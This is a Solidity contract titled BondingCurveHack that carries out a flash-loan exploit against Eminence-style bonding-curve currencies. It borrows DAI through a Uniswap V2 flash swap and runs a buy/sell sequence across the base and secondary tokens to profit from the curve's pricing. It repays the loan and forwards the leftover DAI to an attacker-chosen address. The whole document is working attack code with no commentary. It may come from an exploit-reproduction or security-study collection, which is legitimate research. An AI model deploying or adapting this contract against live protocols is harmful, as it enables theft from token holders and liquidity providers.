pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// import "../bonding-curve/EminenceCurrency.sol";

interface IEminenceCurrency {
    function buy(uint256 _amount, uint256 _min)
        external
        returns (uint256 _bought);

    function sell(uint256 _amount, uint256 _min)
        external
        returns (uint256 _bought);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract BondingCurveHack {
    IEminenceCurrency base;
    IEminenceCurrency token;
    IUniswapV2Pair pair;

    constructor(
        IUniswapV2Pair _pair,
        IEminenceCurrency _base,
        IEminenceCurrency _token
    ) {
        base = _base;
        token = _token;
        pair = _pair;
        IERC20 dai = IERC20(_pair.token1());
        dai.approve(address(_base), type(uint256).max);
        _base.approve(address(_token), type(uint256).max);
    }

    function run(uint256 amount, address to) external {
        pair.swap(0, amount, address(this), abi.encode(to));
    }

    function uniswapV2Call(
        address, /*_sender*/
        uint256, /*_amount0*/
        uint256 _amount1,
        bytes calldata _data
    ) external {
        address to = abi.decode(_data, (address));
        IERC20 dai = IERC20(pair.token1());
        uint256 baseAmount = base.buy(_amount1, 0);
        uint256 tokenAmount = token.buy(baseAmount / 2, 0);
        base.sell(baseAmount / 2, 0);
        baseAmount = token.sell(tokenAmount, 0);
        base.sell(baseAmount, 0);
        uint256 repayAmount = calculateRepay(_amount1);
        dai.transfer(msg.sender, repayAmount);
        dai.transfer(to, dai.balanceOf(address(this)));
    }

    function calculateRepay(uint256 amount) private pure returns (uint256) {
        uint256 num = amount * (10**18) * 1000;
        uint256 x = num / 997 / 10**18;
        return x + 1;
    }
}
